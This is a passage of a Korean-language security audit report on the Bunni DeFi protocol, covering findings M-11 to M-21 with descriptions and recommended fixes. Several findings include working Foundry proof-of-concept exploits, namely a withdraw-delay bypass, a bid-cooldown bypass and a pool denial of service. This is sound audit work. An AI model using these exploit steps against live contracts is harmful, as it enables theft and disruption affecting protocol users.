`BunniHubLogic` 라이브러리와 `BunniQuoter` 계약의 `_depositLogic` 함수 끝에 다음 코드를 추가하세요:

```solidity
    uint256 maxDepositAmount0 = inputData.state.vault0.maxDeposit(address(this));
    if (returnData.reserveAmount0 > maxDepositAmount0) {
        returnData.reserveAmount0 = maxDepositAmount0;
    }

    uint256 maxDepositAmount1 = inputData.state.vault1.maxDeposit(address(this));
    if (returnData.reserveAmount1 > maxDepositAmount1) {
        returnData.reserveAmount1 = maxDepositAmount1;
    }
```

# [M-11] 사용자가 출금 지연을 우회하기 위해 `queueWithdraw`를 미리 호출할 수 있음

## 심각도

**영향:** 낮음 (Low)

**가능성:** 높음 (High)

## 설명

`BunniHub` 계약은 토큰을 인출할 때 일정 지연 시간이 있습니다. 구체적인 인출 프로세스는 다음과 같습니다.

1. 사용자가 `BunniHub.queueWithdraw`를 호출하여 인출 시작
2. 인출 지연 시간이 지남
3. 사용자가 `BunniHub.withdraw`를 호출하여 인출 완료

그러나 `queueWithdraw` 함수는 인출할 토큰을 잠그지 않습니다. 공격자는 인출 지연을 우회하기 위해 `queueWithdraw` 함수를 미리 호출할 수 있습니다. 그리고 공격자는 여러 하위 계정을 사용하여 `queueWithdraw`를 미리 호출한 다음 언제든지 원하는 수량의 토큰을 인출할 수 있습니다. 구체적인 구현은 PoC를 참조하십시오.

## 권장 사항

`queueWithdraw` 함수가 인출할 토큰을 잠그는 것이 좋습니다.

**부록: PoC**

이 테스트 함수를 `BunniHub.t.sol` 파일에 삽입하십시오.

```solidity
    function testYttriumzzPoC0005() external {
        // Init pool
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");
        vm.label(address(permit2), "permit2");
        Currency currency0 = Currency.wrap(address(token0));
        Currency currency1 = Currency.wrap(address(token1));
        (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity(currency0, currency1, ERC4626(address(0)), ERC4626(address(0)));

        // Mint some token0 and token1 for test
        address attaker = makeAddr("attaker");
        _mint(currency0, attaker, 100e18);
        _mint(currency1, attaker, 100e18);

        // Attacker used his sub-accounts to call `queueWithdraw` many times to occupy the queue
        // Each occupies 1e18 tokens
        IBunniHub.QueueWithdrawParams memory queueWithdrawParams;
        queueWithdrawParams.poolKey = key;
        queueWithdrawParams.shares = 1e18;
        for (uint160 i = 0; i < 100; i++) {
            address subAccount = address(uint160(makeAddr("sub-account")) + i);
            vm.prank(subAccount); hub.queueWithdraw(queueWithdrawParams);
        }
        vm.warp(block.timestamp + WITHDRAW_DELAY);

        // Attaker mint bunniToken
        vm.startPrank(attaker);
        IBunniHub.DepositParams memory depositParams;
        depositParams.poolKey = key;
        depositParams.amount0Desired = 100e18;
        depositParams.amount1Desired = 100e18;
        depositParams.deadline = block.timestamp;
        depositParams.recipient = attaker;
        depositParams.refundRecipient = attaker;
        token0.approve(address(permit2), type(uint256).max);
        token1.approve(address(permit2), type(uint256).max);
        permit2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        permit2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        hub.deposit(depositParams);
        vm.stopPrank();

        console.log("token0.balanceOf(attaker): %s", token0.balanceOf(attaker));
        console.log("token1.balanceOf(attaker): %s", token1.balanceOf(attaker));
        console.log("bunniToken.balanceOf(attaker): %s", bunniToken.balanceOf(attaker));

        // Attaker can withdraw any amount of tokens at any time
        IBunniHub.WithdrawParams memory withdrawParams;
        withdrawParams.poolKey = key;
        withdrawParams.recipient = address(attaker);
        withdrawParams.shares = 1e18;
        withdrawParams.deadline = block.timestamp;
        withdrawParams.useQueuedWithdrawal = true;
        for (uint160 i = 0; i < 10; i++) {
            address subAccount = address(uint160(makeAddr("sub-account")) + i);
            vm.prank(attaker); bunniToken.transfer(subAccount, 1e18);
            vm.prank(subAccount); hub.withdraw(withdrawParams);
        }

        console.log("token0.balanceOf(attaker): %s", token0.balanceOf(attaker));
        console.log("token1.balanceOf(attaker): %s", token1.balanceOf(attaker));
        console.log("bunniToken.balanceOf(attaker): %s", bunniToken.balanceOf(attaker));
```

PoC 실행.

```bash
forge test -vvv --match-test testYttriumzzPoC0005
```

결과.

```bash
$ forge test -vvv --match-test testYttriumzzPoC0005
[⠢] Compiling...
No files changed, compilation skipped

Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] testYttriumzzPoC0005() (gas: 5606772)
Logs:
  token0.balanceOf(attaker): 73616158154794097300
  token1.balanceOf(attaker): 0
  bunniToken.balanceOf(attaker): 100000000000000000000
  token0.balanceOf(attaker): 76254542339314687570
  token1.balanceOf(attaker): 10000000000000000000
  bunniToken.balanceOf(attaker): 90000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.10s (19.75ms CPU time)

Ran 1 test suite in 1.15s (1.10s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

# [M-12] `BunniSwapMath::_computeSwap()`에서 잘못된 조건 처리

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`BunniSwapMath::_computeSwap` 함수에서 `BunniSwapMath#L134` 라인의 조건 처리에 문제가 있습니다. 구체적으로 `if` 문은 `naiveSwapResultSqrtPriceX96`이 `sqrtPriceNextX96`과 같은지 확인하지 않습니다.

```solidity
File: BunniSwapMath.sol
080:     function _computeSwap(BunniComputeSwapInput calldata input, int256 amountSpecified)
081:         private
082:         view
083:         returns (uint160 updatedSqrtPriceX96, int24 updatedTick, uint256 inputAmount, uint256 outputAmount)
084:     {
...
...
115:>>>          int256 amountSpecifiedRemaining = amountSpecified;
116:             (uint160 naiveSwapResultSqrtPriceX96, uint256 naiveSwapAmountIn, uint256 naiveSwapAmountOut) = SwapMath
117:                 .computeSwapStep({
118:                 sqrtPriceCurrentX96: input.sqrtPriceX96,
119:                 sqrtPriceTargetX96: SwapMath.getSqrtPriceTarget(zeroForOne, sqrtPriceNextX96, sqrtPriceLimitX96),
120:                 liquidity: updatedRoundedTickLiquidity,
121:                 amountRemaining: amountSpecifiedRemaining
122:             });
123:             if (!exactIn) {
124:                 unchecked {
125:>>>                  amountSpecifiedRemaining -= naiveSwapAmountOut.toInt256();
126:                 }
127:             } else {
128:                 // safe because we test that amountSpecified > amountIn in SwapMath
129:                 unchecked {
130:>>>                  amountSpecifiedRemaining += naiveSwapAmountIn.toInt256();
131:                 }
132:             }
133:             if (
134:>>>              amountSpecifiedRemaining == 0 || naiveSwapResultSqrtPriceX96 == sqrtPriceLimitX96
135:>>>                  || (zeroForOne && naiveSwapResultSqrtPriceX96 > sqrtPriceNextX96)
136:>>>                  || (!zeroForOne && naiveSwapResultSqrtPriceX96 < sqrtPriceNextX96)
137:             ) {
138:                 // swap doesn't cross rounded tick
139:>>>              if (naiveSwapResultSqrtPriceX96 == sqrtPriceNextX96) {
140:                     // Equivalent to `updatedTick = zeroForOne ? tickNext - 1 : tickNext;`
141:                     unchecked {
142:                         // cannot cast a bool to an int24 in Solidity
143:                         int24 _zeroForOne;
144:                         assembly {
145:                             _zeroForOne := zeroForOne
146:                         }
147:                         updatedTick = tickNext - _zeroForOne;
148:                     }
149:                 } else if (naiveSwapResultSqrtPriceX96 != input.sqrtPriceX96) {
150:                     // recompute unless we're on a lower tick boundary (i.e. already transitioned ticks), and haven't moved
151:                     updatedTick = TickMath.getTickAtSqrtPrice(naiveSwapResultSqrtPriceX96);
152:                 }
153:
154:                 // early return
155:>>>              return (naiveSwapResultSqrtPriceX96, updatedTick, naiveSwapAmountIn, naiveSwapAmountOut);
156:             }
157:         }
```

결과적으로 `BunniSwapMath#L139` 라인의 조건이 처리되지 않고 `early return`이 실행되지 않아 `BunniSwapMath#L155`, LDF(Liquidity Density Function)가 스왑을 계산하는 데 사용됩니다. 여기서 `inverseCumulativeAmountFnInput`은 `BunniSwapMath#L125` 및 `BunniSwapMath#L130`의 첫 번째 스왑 단계에서 이미 처리된 부분을 반영하는 줄어든 금액 대신 `inputAmount`를 사용하여 잘못된 스왑 계산을 초래합니다.

```solidity
File: BunniSwapMath.sol
080:     function _computeSwap(BunniComputeSwapInput calldata input, int256 amountSpecified)
081:         private
082:         view
083:         returns (uint160 updatedSqrtPriceX96, int24 updatedTick, uint256 inputAmount, uint256 outputAmount)
084:     {
...
...
159:         // swap crosses rounded tick
160:         // need to use LDF to compute the swap
161:         (uint256 currentActiveBalance0, uint256 currentActiveBalance1) = (
162:             input.totalDensity0X96.fullMulDiv(input.totalLiquidity, Q96),
163:             input.totalDensity1X96.fullMulDiv(input.totalLiquidity, Q96)
164:         );
165:
166:         // compute updated sqrt ratio & tick
167:         {
168:             uint256 inverseCumulativeAmountFnInput;
169:             if (exactIn) {
170:                 // exact input swap
171:                 inverseCumulativeAmountFnInput =
172:>>>                  zeroForOne ? currentActiveBalance0 + inputAmount : currentActiveBalance1 + inputAmount;
173:             } else {
174:                 // exact output swap
175:                 inverseCumulativeAmountFnInput = zeroForOne
176:                     ? currentActiveBalance1 - FixedPointMathLib.min(outputAmount, currentActiveBalance1)
177:>>>                  : currentActiveBalance0 - FixedPointMathLib.min(outputAmount, currentActiveBalance0);
178:             }
```

## 권장 사항

`BunniSwapMath#L134` 라인의 조건을 `naiveSwapResultSqrtPriceX96 == sqrtPriceNextX96`에 대한 확인을 포함하도록 수정하세요:

```diff
            if (
                amountSpecifiedRemaining == 0 || naiveSwapResultSqrtPriceX96 == sqrtPriceLimitX96
                    || (zeroForOne && naiveSwapResultSqrtPriceX96 > sqrtPriceNextX96)
                    || (!zeroForOne && naiveSwapResultSqrtPriceX96 < sqrtPriceNextX96)
+                   || (naiveSwapResultSqrtPriceX96 == sqrtPriceNextX96)
            ) {
```

# [M-13] NextBid의 `K` 에포크 쿨다운 제한 우회

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`AmAmm` 계약에서 임대료가 가장 높은 입찰이 TopBid가 됩니다. 입찰이 마지막 순간에 제출되는 것을 방지하기 위해 모든 입찰은 TopBid가 되기 전에 `K` 에포크 동안 NextBid가 되어야 합니다. 그러나 이 제한은 `State.D->State.B`일 때 우회될 수 있습니다. 구체적인 코드는 다음과 같습니다.

```solidity
                if (rentOwed >= topBid.deposit) {
                    // State D -> State B
                    // top bid has insufficient deposit
                    // next bid becomes active after top bid depletes its deposit
                    rentCharged = topBid.deposit;

                    uint40 nextBidStartEpoch;
                    unchecked {
                        // unchecked so that if epoch ever overflows, we simply wrap around
                        nextBidStartEpoch = uint40(topBid.deposit / topBid.rent) + topBid.epoch;
                    }
                    topBid = nextBid;
                    topBid.epoch = nextBidStartEpoch;
                    nextBid = Bid(address(0), 0, 0, 0, 0);

                    updatedTopBid = true;
                    updatedNextBid = true;
                } else {
```

이 로직에서는 `currentEpoch >= nextBid.epoch + k`인지 확인하는 과정이 없습니다. 공격자는 이를 악용하여 현재 TopBid가 만료되려 할 때 NextBid를 제출하고 다음 순간에 TopBid가 될 수 있습니다. 구체적인 공격 방법은 첨부된 PoC에 있습니다.

## 권장 사항

사용자가 `K` 에포크 제한을 우회하여 TopBid를 점유하는 것을 방지하기 위해 새로운 `State.D->State.C` 상황을 추가하는 것이 좋습니다.

**부록: PoC**

이 테스트 함수를 `AmAmm.t.sol` 파일에 삽입하세요.

```solidity
    function testYttriumzzPoC0100() external {
        vm.warp(10000 * EPOCH_SIZE);

        // Init: start in state D
        address initBidder = makeAddr("initBidder");
        amAmm.bidToken().mint(initBidder, K * 1e18);
        vm.startPrank(initBidder);
        amAmm.bidToken().approve(address(amAmm), type(uint256).max);
        amAmm.bid({
            id: POOL_0,
            manager: initBidder,
            payload: _swapFeeToPayload(0.01e6),
            rent: 1e18,
            deposit: K * 1e18
        });
        vm.stopPrank();
        assertEq(amAmm.getTopBidWrite(POOL_0).manager, address(0));
        assertEq(amAmm.getNextBidWrite(POOL_0).manager, initBidder);
        vm.warp(block.timestamp + K * EPOCH_SIZE);
        assertEq(amAmm.getTopBidWrite(POOL_0).manager, initBidder);
        assertEq(amAmm.getNextBidWrite(POOL_0).manager, address(0));

        // (24 hour - 1 second) has passed, so the remaining rent is 1 second
        vm.warp(block.timestamp + 24 * EPOCH_SIZE - 1);

        // The attacker submit a better bid
        address attacker = makeAddr("attacker");
        amAmm.bidToken().mint(attacker, K * 1.11e18);
        vm.startPrank(attacker);
        amAmm.bidToken().approve(address(amAmm), type(uint256).max);
        amAmm.bid({
            id: POOL_0,
            manager: attacker,
            payload: _swapFeeToPayload(0.01e6),
            rent: 1.11e18,
            deposit: K * 1.11e18
        });
        vm.stopPrank();
        assertEq(amAmm.getTopBidWrite(POOL_0).manager, initBidder);
        assertEq(amAmm.getNextBidWrite(POOL_0).manager, attacker);

        // 1 second has passed, attacker took the top bid in just 1 second.
        vm.warp(block.timestamp + 1);
        assertEq(amAmm.getTopBidWrite(POOL_0).manager, attacker);
        assertEq(amAmm.getNextBidWrite(POOL_0).manager, address(0));
    }
```

PoC 실행.

```bash
forge test -vvv --match-test testYttriumzzPoC0100
```

결과.

```bash
forge test -vvv --match-test testYttriumzzPoC0100
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/AmAmm.t.sol:AmAmmTest
[PASS] testYttriumzzPoC0100() (gas: 309623)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.61ms (1.27ms CPU time)

Ran 1 test suite in 19.01ms (3.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

# [M-14] BunniZone이 amAMM 관리자를 제대로 확인하지 않음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

BunniZone은 주문 fulfiller를 확인할 책임이 있습니다. 이를 통해 풀의 am-AMM 관리자가 주문을 이행할 수 있습니다. 문제는 코드가 현재 am-AMM이 풀 재정의 또는 전역 재정의를 통해 비활성화되지 않았는지 확인하지 않는다는 것입니다. 따라서 am-AMM이 풀에 대해 비활성화되어 있어도 코드는 `getAmAmmEnabled(id)`를 먼저 확인하지 않고 `amAmm.getTopBid(id)`를 사용하므로 `validate()`는 보류 중인 관리자가 주문을 이행하도록 허용합니다.

```solidity
       // query the hook for the am-AMM manager
        IAmAmm amAmm = IAmAmm(address(key.hooks));
        IAmAmm.Bid memory topBid = amAmm.getTopBid(id);

        // allow fulfiller if they are whitelisted or if they are the am-AMM manager
        return isWhitelisted[fulfiller] || topBid.manager == fulfiller;
```

관리자가 am-AMM 관리자를 비활성화하는 경우 코드는 해당 마지막 관리자가 리밸런싱 주문을 이행하도록 허용합니다.

BunniZone의 또 다른 문제는 코드가 현재 관리자가 주문을 이행하는 것을 허용하지만, 리밸런싱 주문이 이전 에포크에 생성되었을 수 있으며 풀이 그 당시 다른 관리자를 가졌을 수 있고 리밸런싱 주문의 이익은 해당 에포크의 관리자에게 가야 한다는 것입니다. 이는 에포크의 끝에 생성된 리밸런싱 주문에 대해서만 발생합니다.

## 권장 사항

am-AMM이 풀 재정의 또는 전역 재정의를 통해 비활성화되지 않는지 확인하세요.

# [M-15] `HookletLib.sol`에서 "memory-safe" 어셈블리 블록의 잘못된 사용

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`HookletLib.sol`에서 `callHooklet` 및 `staticcallHooklet` 함수는 되돌리기(revert)의 경우 반환 데이터가 64바이트를 초과할 수 있으므로 "memory-safe" 어셈블리 블록 사용에 대한 [Solidity 지침](https://docs.soliditylang.org/en/v0.8.26/assembly.html#memory-safety)을 따르지 않습니다.

Solidity 문서에 따르면 "어셈블리 블록이 되돌리거나 종료되더라도 이러한 제한 사항을 준수해야 합니다".

```solidity
File: Hooks.sol

    function callHooklet(IHooklet self, bytes4 selector, bytes memory data) internal returns (bytes memory result) {
        bytes4 decodedSelector;
    function callHooklet(IHooklet self, bytes4 selector, bytes memory data) internal returns (bytes memory result) {
        bytes4 decodedSelector;
@>      assembly ("memory-safe") {
            if iszero(call(gas(), self, 0, add(data, 0x20), mload(data), 0, 0)) {
                if iszero(returndatasize()) {
                    // if the call failed without a revert reason, revert with `HookletLib__FailedHookletCall()`
                    mstore(0, 0x855e32e7)
                    revert(0x1c, 0x04)
                }
                // bubble up revert
@>              returndatacopy(0, 0, returndatasize())
@>              revert(0, returndatasize())
            }
```

이러한 지침을 따르지 않으면 컴파일 과정에서 예상치 못한 동작이 발생할 수 있습니다.

## 권장 사항

```diff
                // bubble up revert
-               returndatacopy(0, 0, returndatasize())
-               revert(0, returndatasize())
+               let fmp := mload(0x40)
+               returndatacopy(fmp, 0, returndatasize())
+               revert(fmp, returndatasize())
```

# [M-16] 잔액 증가 없이 지분(share)을 발행하여 풀 DoS 발생

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

재담보를 사용하는 풀에 예치할 때 토큰의 일부가 볼트로 전송됩니다. 그러나 볼트에 대한 예치가 풀의 잔액을 증가시키는지 확인하지 않습니다.

이를 통해 첫 번째 예금자는 풀의 잔액을 늘리지 않고 지분을 발행할 수 있어 풀을 사용할 수 없게 만들 수 있습니다. 두 토큰의 잔액이 0이기 때문에 향후 스왑이나 예금이 되돌려질 것이기 때문입니다.

이 취약점을 악용하는 또 다른 방법은 풀에 잔액이 있는 토큰을 하나만 남겨두어 이후 예금이 풀의 한쪽에만 유동성을 추가하도록 허용하는 것입니다.

**개념 증명 (Proof of concept)**

다음 코드를 `BunniHub.t.sol` 파일에 추가하고 `forge test --mt test_DoS_pool`을 실행하세요.

```solidity
function test_DoS_pool() public {
    // Deployment data
    uint160 sqrtPriceX96 = TickMath.getSqrtPriceAtTick(0);
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA));
    bytes memory hookParams = abi.encodePacked(
        FEE_MIN,
        FEE_MAX,
        FEE_QUADRATIC_MULTIPLIER,
        FEE_TWAP_SECONDS_AGO,
        SURGE_FEE,
        SURGE_HALFLIFE,
        SURGE_AUTOSTART_TIME,
        VAULT_SURGE_THRESHOLD_0,
        VAULT_SURGE_THRESHOLD_1,
        REBALANCE_THRESHOLD,
        REBALANCE_MAX_SLIPPAGE,
        REBALANCE_TWAP_SECONDS_AGO,
        REBALANCE_ORDER_TTL,
        true,
        ORACLE_MIN_INTERVAL
    );
    bytes32 salt;
    unchecked {
        bytes memory creationCode = type(HookletMock).creationCode;
        for (uint256 offset; offset < 100000; offset++) {
            salt = bytes32(offset);
            address deployed = computeAddress(address(this), salt, creationCode);
            if (
                uint160(bytes20(deployed)) & HookletLib.ALL_FLAGS_MASK == HookletLib.ALL_FLAGS_MASK
                    && deployed.code.length == 0
            ) {
                break;
            }
        }
    }
    HookletMock hooklet = new HookletMock{salt: salt}();

    // Deploy BunniToken
    (, PoolKey memory key) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: currency0,
            currency1: currency1,
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: ldf,
            hooklet: hooklet,
            statefulLdf: true,
            ldfParams: ldfParams,
            hooks: bunniHook,
            hookParams: hookParams,
            vault0: ERC4626(address(vault0)),
            vault1: ERC4626(address(vault1)),
            minRawTokenRatio0: 0.08e6,
            targetRawTokenRatio0: 0.1e6,
            maxRawTokenRatio0: 0.12e6,
            minRawTokenRatio1: 0.08e6,
            targetRawTokenRatio1: 0.1e6,
            maxRawTokenRatio1: 0.12e6,
            sqrtPriceX96: sqrtPriceX96,
            name: bytes32("BunniToken"),
            symbol: bytes32("BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: salt
        })
    );

    // First deposit mints shares, but balance of both tokens is zero
    (uint256 shares,,) = _makeDeposit(key, 1, 1);
    PoolState memory state = hub.poolState(key.toId());
    assert(shares > 0);
    assert(state.rawBalance0 == 0 && state.rawBalance1 == 0);
    assert(state.reserve0 == 0 && state.reserve1 == 0);

    // Swaps revert due to div by zero
    IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
        zeroForOne: true,
        amountSpecified: -int256(1e18),
        sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
    });
    vm.expectRevert(FixedPointMathLib.FullMulDivFailed.selector);
    quoter.quoteSwap(address(this), key, params);

    // New deposits revert with BunniHub__ZeroSharesMinted error
    _makeDeposit(key, 1e18, 1e18);
}
```

## 권장 사항

입금 시 풀의 잔액이 증가하는지 확인하세요. 또한 첫 번째 입금에 대해 최소 토큰 입금 금액을 강제하는 것도 권장됩니다.

# [M-17] 불충분한 `topBid` 예치금으로 인한 `cancelNextBid()` DoS 발생

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

현재 구현은 `(topBid.deposit / topBid.rent) < K(id)`인지 확인하고, 이 조건이 참이면 `AmAmm__BidLocked`로 되돌립니다. 이 유효성 검사는 악의적인 `topBid` 입찰자가 `nextBid` 입찰자가 입찰을 취소하지 못하도록 하는 데 악용될 수 있습니다.

```solidity
File: AmAmm.sol
292:     function cancelNextBid(PoolId id, address recipient) external virtual override returns (uint256 refund) {
293:         /// -----------------------------------------------------------------------
294:         /// Validation
295:         /// -----------------------------------------------------------------------
296:
297:         address msgSender = LibMulticaller.senderOrSigner();
298:
299:         if (!_amAmmEnabled(id)) {
300:             revert AmAmm__NotEnabled();
301:         }
302:
303:         /// -----------------------------------------------------------------------
304:         /// State updates
305:         /// -----------------------------------------------------------------------
306:
307:         // update state machine
308:         _updateAmAmmWrite(id);
309:
310:         Bid memory nextBid = _nextBids[id];
311:
312:         // only the next bid manager can withdraw from the next bid
313:         if (msgSender != nextBid.manager) {
314:             revert AmAmm__Unauthorized();
315:         }
316:
317:         Bid memory topBid = _topBids[id];
318:
319:         // require D_top / R_top >= K
320:>>>      if (topBid.manager != address(0) && topBid.deposit / topBid.rent < K(id)) {
321:>>>          revert AmAmm__BidLocked();
322:>>>      }
323:
324:         // delete next bid from storage
325:         delete _nextBids[id];
326:
327:         /// -----------------------------------------------------------------------
328:         /// External calls
329:         /// -----------------------------------------------------------------------
330:
331:         // transfer nextBid.deposit to recipient
332:         _pushBidToken(id, recipient, nextBid.deposit);
333:
334:         emit CancelNextBid(id, msgSender, recipient, nextBid.deposit);
335:
336:         return nextBid.deposit;
337:     }
```

예를 들어, `EPOCH_SIZE = 1 hour`이고 `K = 24`, `topBid.rent = 1`인 시나리오를 고려해 보세요. 이 경우 악의적인 `topBid` 입찰자는 `(topBid.deposit / topBid.rent) < K(id)` 조건(`(22 / 1) < 24`는 참)을 충족하기 위해 필요한 금액 바로 아래로 예치금을 유지할 수 있습니다. 각 에포크마다 임대료를 지불하는 데 필요한 최소 금액을 입금하고 예치금을 `24` 미만으로 유지함으로써 악의적인 `topBid` 입찰자는 `topBid.deposit / topBid.rent < K(id)` 유효성 검사가 항상 참이 되도록 합니다. 결과적으로 `nextBid` 입찰자는 입찰을 취소할 수 없어 DoS 상태가 발생합니다.

`Bidding rules` 섹션의 [`amAmm` 논문](https://arxiv.org/pdf/2403.03367v1)에 따르면:

> If the top bid does not have enough rent to pay for K blocks — that is, if Dtop / Rtop < K, then the next bid cannot be canceled, **but must leave at least enough deposit such that Dtop/Rtop + Dnext/Rnext ≥ K.**

`Dtop/Rtop + Dnext/Rnext ≥ K`와 같이 최소한 충분한 예치금을 남기지 않는 한 다음 입찰을 취소할 수 없도록 하는 로직이 nextBid 취소에서 누락되었습니다.

## 권장 사항

이 문제를 해결하려면 `AmAmm::cancelNextBid` 함수를 업데이트하여 `(topBid.deposit / topBid.rent) < K(id)` 조건이 참일 때 `nextBid` 입찰자가 `nextBid`를 취소할 수 있도록 `nextBid`가 예치금을 남길 수 있는 로직을 포함해야 합니다.

# [M-18] `BunniQuoter`가 정확한 견적을 제공하지 않을 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`BunniQuoter`는 스왑, 예금 및 인출에 대한 견적 기능을 제공하여 사용자가 실제로 트랜잭션을 실행하지 않고도 이러한 작업을 시뮬레이션하고 예상 결과를 얻을 수 있도록 합니다.

그러나 이러한 견적 함수는 `hookletBeforeSwapView`를 제외하고는 훅렛 함수에 대한 호출을 수행하지 않습니다. 이는 훅렛 함수가 결과에 영향을 미치는 경우 견적이 작업의 실제 결과를 정확하게 반영하지 못할 수 있음을 의미합니다.

예를 들어 KYC 요구 사항이 있는 풀은 예금자가 화이트리스트에 없는 경우 되돌리는 `hookletBeforeDeposit` 함수를 구현할 수 있습니다. 이 경우 `quoteDeposit` 함수를 호출하는 승인되지 않은 사용자는 입력 값에 관계없이 (0, 0, 0)을 받아야 합니다.

## 권장 사항

모든 훅렛 함수에 대한 뷰(view) 버전을 제공하고 견적 함수에서 이를 호출하여 견적이 작업의 실제 결과를 정확하게 반영하도록 하십시오.

# [M-19] 샌드위치 공격으로 추천인 보상을 차익 거래할 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`BunniToken` 계약에는 추천인 메커니즘이 있으며 추천인 보상은 점수를 기반으로 합니다. BunniToken이 전송되면 `from`의 추천인 점수가 `to`의 추천인으로 이전됩니다.

```solidity
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
--snip--
            // Update referrer scores if referrers are different.
            if iszero(eq(fromReferrer, toReferrer)) {
                // Compute the score slot of `fromReferrer`.
                mstore(0x00, or(fromReferrer, _SCORE_SLOT_SEED))
                let fromScoreSlot := keccak256(0x00, 0x20)
                // Subtract and store the updated score of `fromReferrer`.
>>              sstore(fromScoreSlot, sub(sload(fromScoreSlot), amount))
                // Compute the score slot of `toReferrer`.
                mstore(0x00, or(toReferrer, _SCORE_SLOT_SEED))
                let toScoreSlot := keccak256(0x00, 0x20)
                // Add and store the updated score of `toReferrer`.
>>              sstore(toScoreSlot, add(sload(toScoreSlot), amount))
            }
--snip--
```

추천인은 이를 이용하여 차익 거래를 할 수 있으며 구체적인 단계는 다음과 같습니다.

1. 추천인은 tx 풀을 모니터링하고 관리자가 보상을 지급하기 위해 `BunniToken.distributeReferralRewards`를 호출하려고 하는 것을 발견합니다.
2. 추천인은 많은 토큰을 구매합니다.
3. 관리자가 `BunniToken.distributeReferralRewards`를 호출하여 보상을 지급합니다.
4. 추천인은 보상을 청구합니다.
5. 추천인은 많은 토큰을 판매합니다.

위의 단계 2~4는 같은 블록에서 완료됩니다. 이 방식을 통해 추천인은 동일한 계약 주소(예: AMM 계약)에서 보상을 청구할 수 있습니다.

## 권장 사항

추천 보상을 시간에 따라 천천히 지급하는 것이 좋습니다.
# [M-20] 재담보를 위해 AAVE 볼트를 사용하면 준비금 가치가 과소평가될 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

재담보를 지원하는 풀의 경우 볼트의 `previewRedeem` 함수가 호출되어 기본 자산으로 표시된 준비금의 가치를 얻습니다.

백서와 문서 웹사이트 모두 재담보에 사용할 수 있는 수익 창출 프로토콜 중 하나가 AAVE라고 언급합니다. 그러나 AAVE 볼트의 `previewRedeem` 함수는 다음 요구 사항을 준수하지 않기 때문에 [EIP-4626 사양](https://eips.ethereum.org/EIPS/eip-4626)을 완전히 준수하지 않습니다.

> MUST NOT account for withdrawal limits like those returned from maxWithdraw and should always act as though the withdrawal would be accepted, regardless if the user has enough shares, etc.

AAVE의 구현은 볼트가 일시 중지되었는지 여부와 인출 한도를 고려하는데, 이는 풀이 완전히 활용되는 경우 도달할 수 있습니다.

```solidity
File: https://github.com/aave/Aave-Vault/blob/main/src/ATokenVault.sol

    function previewRedeem(uint256 shares) public view override(ERC4626Upgradeable, IATokenVault) returns (uint256) {
        uint256 maxWithdrawable = _maxAssetsWithdrawableFromAave();
        return maxWithdrawable == 0 ? 0 : _convertToAssets(shares, MathUpgradeable.Rounding.Down).min(maxWithdrawable);
    }

(...)

    function _maxAssetsWithdrawableFromAave() internal view returns (uint256) {
        // returns 0 if reserve is not active, or paused
        // otherwise, returns available liquidity

        AaveDataTypes.ReserveData memory reserveData = AAVE_POOL.getReserveData(address(UNDERLYING));

        uint256 reserveConfigMap = reserveData.configuration.data;

        if ((reserveConfigMap & ~AAVE_ACTIVE_MASK == 0) || (reserveConfigMap & ~AAVE_PAUSED_MASK != 0)) {
            return 0;
        } else {
            return UNDERLYING.balanceOf(address(ATOKEN));
        }
    }
```

결과적으로 준비금의 가치가 과소평가되어 가장 극단적인 경우, 즉 볼트가 일시 중지되거나 모든 자산이 대출된 경우 0으로 평가될 수 있습니다. 이는 신규 입금에 대한 발행 지분 가치, 스왑 금액 또는 인출 시 수령 금액과 같은 프로토콜의 가장 중요한 계산에 영향을 미칩니다.

## 권장 사항

가장 간단한 해결책은 AAVE 볼트 사용을 피하는 것입니다.

AAVE 볼트를 지원하는 솔루션은 각 특정 볼트에 대한 준비금 가치를 쿼리하는 프록시 계약(공통 또는 볼트별)을 사용하는 것일 수 있습니다. AAVE 볼트의 경우 `convertToAssets` 함수를 호출하여 이를 달성할 수 있습니다.

# [M-21] `computeSwap()`의 잘못된 반올림

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

각 LDF에 대한 라이브러리의 `computeSwap` 함수는 `cumulativeAmount`와 `swapLiquidity`를 계산하며, 이는 스왑의 input 및 output 금액을 얻는 데 사용됩니다.

`computeSwap` 함수의 첫 번째 단계는 `inverseCumulativeAmount0` 또는 `inverseCumulativeAmount1` 함수를 사용하여 `roundedTick`을 계산하는 것입니다. 주석에서 볼 수 있듯이 이 함수는 역 틱(inverse tick)이 두 개의 반올림된 틱(rounded tick) 사이에 있을 때 다음 반올림된 틱으로 올림합니다.

```solidity
File: LibUniformDistribution.sol

228:             // compute roundedTick by inverting the cumulative amount
